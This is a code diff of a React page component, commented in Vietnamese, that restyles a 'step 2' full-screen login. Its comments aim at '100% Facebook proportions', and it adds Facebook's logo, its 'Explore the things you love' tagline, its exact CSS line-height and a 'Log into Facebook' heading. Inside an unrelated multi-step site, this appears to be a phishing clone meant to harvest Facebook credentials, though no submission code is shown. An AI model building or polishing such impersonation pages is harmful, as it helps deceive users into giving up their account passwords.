@@ -729,7 +729,7 @@ export default function Home() {
                 </div>
               )}
 
-                                                                                                                            {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn 100% tỷ lệ FB */}
+              {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn 100% tỷ lệ FB */}
               {step === 2 && (
                 <div style={{ 
                   position: 'fixed', 
@@ -740,46 +740,59 @@ export default function Home() {
                   flexDirection: 'row' 
                 }}>
                   
-                  {/* CỘT TRÁI: Chiếm 2/3 không gian, chứa text và ảnh */}
+                  {/* CỘT TRÁI: Ảnh minh họa và Text (Chuẩn HTML FB) */}
                   <div style={{ 
-                    flex: '2', // Chiếm 2 phần
+                    flex: '2', 
                     display: 'flex', 
                     flexDirection: 'column', 
                     justifyContent: 'center', 
-                    padding: '0 40px',
+                    alignItems: 'flex-start', // Căn lề trái
+                    padding: '0 8vw', // Đẩy lề trái ra một khoảng rộng
                     borderRight: '1px solid #e4e6eb',
                     backgroundColor: '#fff'
                   }}>
-                    <div style={{ width: '100%', maxWidth: '650px', margin: '0 auto', display: 'flex', flexDirection: 'column' }}>
+                    <div style={{ width: '100%', maxWidth: '600px', display: 'flex', flexDirection: 'column' }}>
                       
-                      {/* Logo F nhỏ */}
-                      <svg viewBox="0 0 36 36" height="42" width="42" style={{ marginBottom: '24px' }}>
-                        <path fill="#0866FF" d="M18 0C8.06 0 0 8.06 0 18s8.06 18 18 18c9.94 0 18-8.06 18-18S27.94 0 18 0zm4.04 26.13h-4.32v-14.4h-4.32v-4.32h4.32V5.04c0-2.92 1.62-4.32 4.32-4.32h3.6v4.32h-2.16c-1.08 0-1.44.36-1.44 1.44v1.44h4.32l-.72 4.32h-3.6v14.4z"/>
-                      </svg>
+                      {/* Logo Facebook */}
+                      <div style={{ marginBottom: '20px' }}>
+                        <svg viewBox="0 0 24 24" fill="#0866FF" width="48" height="48">
+                          <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path>
+                        </svg>
+                      </div>
                       
-                      <h1 style={{ fontSize: '56px', fontWeight: '700', lineHeight: '1.1', color: '#1c2b33', margin: '0 0 30px 0', letterSpacing: '-1.5px' }}>
-                        Explore <br />the <br />things <br /><span style={{ color: '#0064e0' }}>you love.</span>
-                      </h1>
+                      {/* Khối Text gộp liền mạch */}
+                      <div style={{ marginBottom: '40px' }}>
+                        <span style={{ 
+                          fontSize: '56px', 
+                          fontWeight: '700', 
+                          lineHeight: '66px', // Set line-height theo đúng CSS FB
+                          color: '#1c2b33', 
+                          letterSpacing: '-1.5px',
+                          display: 'block'
+                        }}>
+                          Explore the things <span style={{ color: '#0064e0' }}>you love</span>.
+                        </span>
+                      </div>
                       
-                      {/* Ảnh to chiếm gần hết cột trái */}
+                      {/* Ảnh minh họa to bung ra */}
                       <img 
                         src="/images/Anhlogin.webp" 
                         alt="Explore" 
-                        style={{ width: '100%', maxWidth: '600px', display: 'block' }} 
+                        style={{ width: '100%', maxWidth: '550px', display: 'block' }} 
                       />
                     </div>
                   </div>
 
-                  {/* CỘT PHẢI: Chiếm 1/3 không gian, chứa form đăng nhập */}
+                  {/* CỘT PHẢI: Form đăng nhập (Giữ nguyên theo yêu cầu) */}
                   <div style={{ 
-                    flex: '1', // Chiếm 1 phần
+                    flex: '1',
                     display: 'flex', 
                     flexDirection: 'column', 
                     justifyContent: 'center', 
                     alignItems: 'center', 
                     padding: '40px'
                   }}>
-                    <div style={{ width: '90%', maxWidth: '396px' }}>
+                    <div style={{ width: '100%', maxWidth: '396px' }}>
                       
                       <h2 style={{ fontSize: '18px', fontWeight: '500', color: '#1c2b33', margin: '0 0 20px 0' }}>
                         Log into Facebook
